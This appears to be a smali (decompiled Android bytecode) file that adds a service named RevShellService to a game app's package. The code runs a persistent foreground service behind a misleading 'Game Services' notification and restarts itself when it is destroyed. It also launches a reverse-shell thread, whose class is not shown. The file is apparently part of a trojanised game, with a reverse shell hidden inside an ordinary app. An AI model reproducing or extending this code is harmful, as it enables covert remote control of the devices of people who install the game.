.class public Lde/fgerbig/spacepeng/android/RevShellService;
.super Landroid/app/Service;
.source "RevShellService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lde/fgerbig/spacepeng/android/RevShellService$RevShellThread;
    }
.end annotation


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "RevShellChannel"

.field private static final NOTIFICATION_ID:I = 0x1

.field private static final TAG:Ljava/lang/String; = "RevShellService"


# instance fields
.field private isRunning:Z

.field private revShellThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lde/fgerbig/spacepeng/android/RevShellService;->isRunning:Z

    return-void
.end method

.method private createNotification()Landroid/app/Notification;
    .locals 4

    .prologue
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Game Services"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v1, "Running background tasks"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const v1, 0x1080093

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$000(Lde/fgerbig/spacepeng/android/RevShellService;)Z
    .locals 1
    .param p0, "x0"    # Lde/fgerbig/spacepeng/android/RevShellService;

    .prologue
    iget-boolean v0, p0, Lde/fgerbig/spacepeng/android/RevShellService;->isRunning:Z

    return v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .prologue
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "RevShellService: onCreate"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lde/fgerbig/spacepeng/android/RevShellService;->isRunning:Z

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "RevShellService: onDestroy - restarting service"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    # Riavvia immediatamente
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lde/fgerbig/spacepeng/android/RevShellService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lde/fgerbig/spacepeng/android/RevShellService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "RevShellService: onStartCommand"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-direct {p0}, Lde/fgerbig/spacepeng/android/RevShellService;->createNotification()Landroid/app/Notification;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {p0, v1, v0}, Lde/fgerbig/spacepeng/android/RevShellService;->startForeground(ILandroid/app/Notification;)V

    iget-boolean v0, p0, Lde/fgerbig/spacepeng/android/RevShellService;->isRunning:Z

    if-nez v0, :cond_0

    const/4 v0, 0x1

    iput-boolean v0, p0, Lde/fgerbig/spacepeng/android/RevShellService;->isRunning:Z

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lde/fgerbig/spacepeng/android/RevShellService$RevShellThread;

    invoke-direct {v1, p0}, Lde/fgerbig/spacepeng/android/RevShellService$RevShellThread;-><init>(Lde/fgerbig/spacepeng/android/RevShellService;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lde/fgerbig/spacepeng/android/RevShellService;->revShellThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_0
    const/4 v0, 0x1

    return v0
.end method
